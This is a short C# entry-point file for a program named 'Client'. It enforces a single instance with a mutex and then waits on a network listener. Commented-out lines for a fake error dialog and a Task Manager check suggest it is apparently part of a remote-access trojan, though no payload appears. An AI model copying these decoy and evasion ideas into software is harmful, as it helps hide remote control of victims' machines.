using System;
using System.Threading.Tasks;
using System.Threading;


namespace Client
{
    static class Program
    {
       
        [STAThread]
        static void Main()
        {
            //MessageBox.Show(Resources.FakeError,@"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

            using (var mutex = new Mutex(false, "Client"))
            {
                bool isAnotherInstanceOpen = !mutex.WaitOne(TimeSpan.Zero);
                if (isAnotherInstanceOpen)
                {
                    return;
                }

                //Task temp = ConnectionManager.CheckForTaskManager();
                Task task = ConnectionManager.Listen();
                task.Wait();
                mutex.ReleaseMutex();
            }
        }
    }

}
